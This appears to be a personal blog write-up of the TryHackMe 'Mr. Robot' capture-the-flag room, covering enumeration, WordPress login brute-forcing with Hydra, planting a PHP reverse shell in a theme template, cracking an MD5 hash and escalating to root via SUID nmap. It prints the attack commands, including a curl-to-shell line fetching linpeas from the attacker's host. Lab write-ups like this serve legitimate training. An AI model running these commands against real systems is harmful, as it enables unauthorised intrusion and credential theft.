---
title: TryHackMe - Mr. Robot CTF 
date: 2024-01-20 00:00:00 +/-0800
categories: [TryHackMe]
tags: [TryHackMe, CTF]     # TAG names should always be lowercase
---
https://tryhackme.com/room/mrrobot

Connecting to the VPN to access the box :

```bash
sudo openvpn vpn.ovpn
```

## Reconnaissance

Starting with the initial recon, an Nmap scan will allow us to see any open ports and services running on the machine.

```bash
nmap -sC -sV -Pn 10.10.123.154
```

![IMG-1](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(29).png)

Seeing that ports 80 and 443 are open means that the machine is running some form of webpage. Upon visiting the site, we are greeted with a very Mr. Robot-esque-themed website.

![IMG-2](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(30).png)

We can use tools such as Gobuster or dirbuster to enumerate different directories or files that the site is serving.

``` bash
gobuster dir -u http://10.10.123.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

The results of the Gobuster scan give us some very interesting results.

![IMG-3](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(31).png)

Upon viewing some of these, robots.txt stands out and seems to contain the first flag we need for the challenge, additionally we can see a dictionary file which may come in handy later.

![IMG-4](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(32).png)

We can view these files either by visiting the page directly or by pulling them down to our own machine using curl.

```bash
curl http://10.10.123.154/fsocity.dic > fsocity.dic
curl http://10.10.123.154/key-1-of-3.txt > key-1.txt
```

![IMG-5](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(33).png)

Viewing the contents of key-1.txt does, in fact, confirm this is the first flag we need for the challenge.

![IMG-6](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(34).png)

![IMG-7](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(35).png)

Viewing the contents of the dictionary file we got, indicates that this is a wordlist:

![IMG-8](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(36).png)

Now that the first flag has been found, further investigation into the findings of Gobuster might help us. Another interesting find is that the site is running an instance of WordPress.

## Attacking WordPress

Landing on the "/wp-login.php" page, we are greeted with a classic WordPress login prompt.

![IMG-9](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(37).png)

We can attack this page using either wpscan or Hydra in combination with the dictionary file we retrieved earlier in attempts to brute-force the login page. However, before brute forcing, I noticed that the dictionary file had a number of repeating strings, meaning that it would increase the time it takes to brute-force the site.

![IMG-10](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(1).png)

Again, seen multiple instances of the same string:

![IMG-11](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(2).png)

To shorten the wordlist, we can use the "sort" and "uniq" commands, meaning that we can reduce the time it takes to brute-force the site by removing some of the repeated strings.

```bash 
cat fsocity.dic | sort | uniq > new-fsocity.dic
```

We can confirm by using the "wc" command and notice that the wordlist is now much smaller, with no repeating strings.

![IMG-12](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(3).png)

Now that the wordlist is smaller, we can brute-force the site much quicker. Let's get to Hydra.

Firstly, we will need to fire up Burp Suite to act as a proxy and intercept traffic, which will then help us when crafting the attack required for Hydra.

![IMG-13](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(4).png)

Line 16 of the HTTP POST request will be required to perform a brute-force correctly.

![IMG-14](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(5).png)

The "Invalid username" output is also required for Hydra.

![IMG-15](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(6).png)

Now with the required data that we need, the first Hydra command was used to in attempts to gather a username with a placeholder password. 

```bash
hydra -L new-fsocity.dic -p placeholder 10.10.123.154 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.123.154%2Fwp-admin%2F&testcookie=1: Invalid username"
```

Hydra has can back with "Elliot" being a valid username.

![IMG-16](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(7).png)

This can be confirmed through information disclosure, when we try the WordPress site with the username "Elliot" and a placeholder password, it gives us a different error than before.

![IMG-17](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(8).png)

Now we can run Hydra again with "Elliot" as the username and use the wordlist for the password field.

```bash
hydra -l Elliot -P new-fsocity.dic 10.10.123.154 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.123.154%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

The results of the Hydra brute-force come back with the login as "Elliot" and the password as "ER28-0652"

![IMG-18](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(9).png)

We now have access to the WordPress page.

![IMG-19](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(10).png)

However, if bruteforcing isn't your thing, within the "/license" page that Gobuster found, there was a Base64-encoded string with the username and password given to us.

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Putting it into Cyberchef, we get the same username and credentials that we brute-forced.

![IMG-20](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(11).png)

## PHP Reverse Shell

By viewing the appearance tab, we can change the contents of the website. More specifically, there is a 404.php template in which we can overwrite the existing code with our PHP reverse shell. For the PHP reverse shell, I will be using one provided by Pentestmonkey, which can be found here: https://pentestmonkey.net/tools/web-shells/php-reverse-shell.

![IMG-21](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(12).png)

Before we run our reverse shell, we first have to setup a listener via netcat using the following command:

```bash
nc -lnvp 4444
```

Once uploaded, all we need to do is know where the PHP script is uploaded.

```
http://10.10.123.154/wp-admin/404.php
```

Boom, we now have a shell:

![IMG-22](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(14).png)

We can make the shell more stable by spawning a tty shell. This is done by running a simple Python command:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Navigating the file system, we find the next key needed for the challenge; additionally, we find a password.raw-md5 file. However, due to the key file only having read permissions for the file owner, we can only access the password.raw-md5 file.

![IMG-23](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(16).png)

In the password.raw-md5 file, we are given the username and password hash for the "robot" user.

```
c3fcd3d76192e4007dfb496cca67e13b
```

![IMG-24](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(17).png)

Using crackstation, we can see that the result of the cracked password is:

```
abcdefghijklmnopqrstuvwxyz
```

![IMG-25](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(18).png)

You could also get this password by using John the Ripper to crack the hash with the following command:

```bash
sudo john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![IMG-26](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(19).png)

We can now login as the robot user:

![IMG-27](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(20).png)

Again having to run the tty shell python command

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

![IMG-28](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(21).png)

![IMG-29](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(27).png)



## Privilege escalation

To escalate privelages on the machine, I quickly spun up a python server, staging the linpeas script.

```bash
cd /usr/share/peass/linpeas
python3 -m http.server 80
```

Back on the target machine, we can run linpeas with the following command:

```bash
curl 10.8.84.132:80/linpeas.sh | sh
```

The script then runs and will show us any privilege escalation paths. As expected linpeas found many ways of privilege escalation, but one that stood out was the SUID for Nmap.

![IMG-30](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(22).png)

From here we can use the GTFOBins resource and follow the steps provided:

![IMG-31](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(23).png)

We now have root!

![IMG-32](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(24).png)

The root directory holds the final flag needed for the room.

![IMG-33](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(25).png)

We finished the challenge and got root on the machine. :)

![IMG-34](/assets/Mr-Robot-CTF-Images/Mr-Robot-CTF%20(28).png)
